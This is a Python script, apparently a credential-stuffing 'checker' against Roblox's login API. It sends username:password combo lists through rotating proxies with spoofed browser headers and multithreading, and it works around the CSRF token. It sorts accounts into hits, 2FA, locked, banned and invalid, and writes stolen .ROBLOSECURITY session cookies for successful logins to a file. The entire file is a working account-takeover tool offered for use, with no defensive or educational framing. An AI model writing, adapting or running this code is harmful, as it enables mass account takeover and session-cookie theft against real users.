import os
import json
import random
import requests
from colorama import Fore
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

def load_config():
    with open("config.json") as f:
        return json.load(f)

def write_output(file, text):
    with open(os.path.join(config["results_dir"], f"{file}.txt"), "a", encoding="utf-8", errors="ignore") as f:
        f.write(f"{text}\n")

def process_response(resp, combo):
    global STATS
    if "Incorrect username or password" in resp.text:
        STATS['INVALID'] += 1
        STATS['TOTAL'] += 1
        write_output("invalid", combo)
    elif "Account has been locked." in resp.text or "Please use Social" in resp.text:
        write_output("locked", combo)
        STATS['LOCKED'] += 1
        STATS['TOTAL'] += 1
    elif "You must pass the Security Question" in resp.text or "twoStepVerificationData" in resp.text:
        write_output("2fa", combo)
        STATS['2FA'] += 1
        STATS['TOTAL'] += 1
    elif "isBanned\":true" in resp.text:
        write_output("banned", combo)
        STATS['BANNED'] += 1
        STATS['TOTAL'] += 1
    elif "displayName" in resp.text:
        try:
            cookie = resp.cookies[".ROBLOSECURITY"]
            if cookie:
                STATS['HITS'] += 1
                STATS['TOTAL'] += 1
                write_output("hits", f"{combo.split(':')[0]}:{combo.split(':')[1]}")
                write_output("cookies", f"{cookie}")
            else:
                STATS['HITS'] += 1
                STATS['TOTAL'] += 1
                write_output("hits", combo)
        except Exception as e:
            write_output("hits", combo)
    print_progress()

def worker(combos):
    proxy = random.choice(proxies_list)
    
    headers = {
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.6',
        'referer': 'https://www.roblox.com/',
        'sec-ch-ua': '"Brave";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-site',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    }

    cookies = {
        'RBXEventTrackerV2': 'CreateDate=4/8/2024 3:13:39 PM&rbxid=&browserid=222588017639',
        'GuestData': 'UserID=-1107485453',
        'RBXImageCache': 'timg=2UKdK8o1KTDKOAff1Q6sZvehA3nsAXlAsDB5VeerO0XlqVpP7Nc9kOI5TihUc5gizpQjzV8d1Axfx5Zgduj1UQ3TrGhQb5Nz22mljIosN5iOKPq-Or4JWziamKlkCfHGHsYD9ZU6-GGy_p5oM_BZdVtFZTB7Cm9udvS1n7vBiU8kMGP5LJ8GddVU-gPktgng2SEEOYkqbokwguZBuR7S8Q',
        'RBXSource': 'rbx_acquisition_time=3/31/2024 8:15:38 PM&rbx_acquisition_referrer=https://www.roblox.com/&rbx_medium=Social&rbx_source=www.roblox.com&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=1',
    }

    session = requests.Session()
    retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
    session.mount('https://', HTTPAdapter(max_retries=retries))

    for combo in combos:
        try:
            credential, password = combo.split(":", 1)
            resp = session.post(
                url="https://auth.roblox.com/v2/login",
                headers=headers,
                cookies=cookies,
                json={
                    "ctype": "Username",
                    "cvalue": credential,
                    "password": password
                },
                proxies = {"https": f"http://{proxy}"},
                timeout = 15
            )

            process_response(resp, combo)
            
            if "x-csrf-token" in resp.headers:
                headers["x-csrf-token"] = resp.headers["x-csrf-token"]
                resp = session.post(
                    url="https://auth.roblox.com/v2/login",
                    headers=headers,
                    cookies=cookies,
                    json={
                        "ctype": "Username",
                        "cvalue": credential,
                        "password": password
                    },
                    proxies = {"https": f"http://{proxy}"},
                    timeout = 15
                )
                process_response(resp, combo)
        except Exception as e:
            pass

    session.close()

def print_progress():
    print(f'\r{Fore.MAGENTA}[CHECKER]: {Fore.GREEN}TOTAL: {STATS["TOTAL"]} | {Fore.CYAN}HITS: {STATS["HITS"]} | {Fore.LIGHTMAGENTA_EX}2FA: {STATS["2FA"]} | {Fore.YELLOW}Locked: {STATS["LOCKED"]} | {Fore.RED}Invalid: {STATS["INVALID"]}', end='', flush=True)

if __name__ == '__main__':
    config = load_config()
    
    INPUT_DIR = config["input_dir"]
    RESULTS_DIR = config["results_dir"]
    PROXIES_FILE = os.path.join(INPUT_DIR, config["proxies_file"])
    COMBOS_FILE = os.path.join(INPUT_DIR, config["combos_file"])
    THREAD_COUNT = config["thread_count"]

    proxies_list = open(PROXIES_FILE, "r").read().splitlines()
    combos_list = list(set(line.strip() for line in open(COMBOS_FILE, "r", encoding="utf-8", errors="ignore").readlines()))
    
    STATS = {
        'TOTAL': 0,
        'HITS': 0,
        '2FA': 0,
        'LOCKED': 0,
        'BANNED': 0,
        'INVALID': 0
    }

    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        chunk_size = len(combos_list) // THREAD_COUNT
        combos_chunks = [combos_list[i:i + chunk_size] for i in range(0, len(combos_list), chunk_size)]
        executor.map(worker, combos_chunks)